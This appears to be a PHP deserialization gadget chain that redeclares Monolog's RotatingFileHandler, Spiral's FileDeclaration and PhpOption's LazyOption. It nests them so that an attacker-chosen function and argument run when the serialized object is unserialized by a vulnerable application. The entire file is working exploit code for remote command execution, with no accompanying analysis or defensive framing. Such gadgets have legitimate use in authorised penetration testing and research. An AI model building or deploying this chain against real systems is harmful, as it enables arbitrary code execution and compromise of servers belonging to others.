<?php

namespace Monolog\Handler
{
    class RotatingFileHandler
    {
        protected $mustRotate;
        protected $filename;
        protected $filenameFormat;
        protected $dateFormat;

        function __construct($function,$param)
        {
            $this->dateFormat = "l";
            $this->mustRotate = true;
            $this->filename = "anything";
            $this->filenameFormat = new \Spiral\Reactor\FileDeclaration($function,$param);
        }
    }
}

namespace Spiral\Reactor
{
    class FileDeclaration
    {
        private $docComment;

        public function __construct($function,$parameter)
        {
            $this->docComment = new \PhpOption\LazyOption($function,$parameter);
        }
    }
}

namespace PhpOption
{
    class LazyOption
    {
        private $callback;
        private $arguments;

        public function __construct($function,$parameter)
        {
            $this->callback = $function;
            $this->arguments = [$parameter];
        }
    }
}